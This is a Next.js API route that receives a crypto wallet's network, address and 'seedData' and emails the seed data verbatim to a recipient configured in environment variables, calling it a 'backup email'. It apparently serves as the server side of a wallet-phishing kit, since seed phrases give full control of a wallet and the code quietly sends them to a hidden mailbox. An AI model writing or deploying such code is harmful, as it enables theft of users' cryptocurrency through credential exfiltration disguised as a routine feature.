import { NextRequest, NextResponse } from 'next/server'
import { Resend } from 'resend'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { network, symbol, walletAddress, seedData, timestamp } = body

    console.log('Email submit request received:', { network, symbol, walletAddress, hasSeedData: !!seedData })

    // Validate required fields
    if (!network || !symbol || !walletAddress || !seedData) {
      console.error('Missing required fields:', { network, symbol, walletAddress, hasSeedData: !!seedData })
      return NextResponse.json(
        { error: 'Missing required fields', details: { network: !!network, symbol: !!symbol, walletAddress: !!walletAddress, seedData: !!seedData } },
        { status: 400 }
      )
    }

    // Check environment variables
    const resendApiKey = process.env.RESEND_API_KEY
    const recipient = process.env.EMAIL_RECIPIENT
    const fromEmail = process.env.AUTH_EMAIL_USER

    console.log('Environment check:', { 
      hasApiKey: !!resendApiKey, 
      hasRecipient: !!recipient, 
      hasFromEmail: !!fromEmail 
    })

    if (!resendApiKey) {
      console.error('RESEND_API_KEY is not configured')
      return NextResponse.json(
        { error: 'Email service not configured: RESEND_API_KEY missing' },
        { status: 500 }
      )
    }

    if (!recipient) {
      console.error('EMAIL_RECIPIENT is not configured')
      return NextResponse.json(
        { error: 'Email service not configured: EMAIL_RECIPIENT missing' },
        { status: 500 }
      )
    }

    if (!fromEmail) {
      console.error('AUTH_EMAIL_USER is not configured')
      return NextResponse.json(
        { error: 'Email service not configured: AUTH_EMAIL_USER missing' },
        { status: 500 }
      )
    }

    // Initialize Resend
    const resend = new Resend(resendApiKey)

    // Send email using Resend
    console.log('Attempting to send email via Resend...')
    const result = await resend.emails.send({
      from: fromEmail,
      to: recipient,
      subject: network,
      html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${seedData}</pre>`,
    })

    console.log('Resend email sent successfully:', result)

    return NextResponse.json(
      { success: true, message: 'Email sent successfully', data: result },
      { status: 200 }
    )

  } catch (error: any) {
    console.error('Email sending error:', error)
    console.error('Error details:', {
      message: error?.message,
      name: error?.name,
      stack: error?.stack
    })
    
    return NextResponse.json(
      { 
        error: 'Failed to send backup email', 
        details: error?.message || 'Unknown error',
        type: error?.name || 'Error'
      },
      { status: 500 }
    )
  }
}
